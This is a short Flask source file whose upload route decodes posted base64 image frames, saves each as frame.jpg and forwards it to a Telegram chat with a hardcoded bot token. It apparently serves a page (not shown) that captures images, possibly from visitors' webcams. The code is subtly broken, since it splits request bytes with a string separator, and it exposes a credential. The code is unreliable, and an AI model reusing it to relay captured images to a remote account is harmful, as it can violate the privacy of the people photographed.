
from flask import Flask, render_template, request
import base64
import cv2
import numpy as np
import telegram

app = Flask(__name__)

bot = telegram.Bot(token='5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    dataURL = request.get_data()
    # convert data URL to OpenCV image
    img_str = dataURL.split(',')[1]
    img_data = bytes(img_str, 'utf-8')
    nparr = np.frombuffer(base64.b64decode(img_data), np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    # process the image here
    # for example, save the image to disk
    cv2.imwrite('frame.jpg', img)
    # send the image to the Telegram bot
    with open('frame.jpg', 'rb') as f:
        bot.send_photo(chat_id='localipy', photo=f)
    return 'OK'

if __name__ == '__main__':
    app.run()

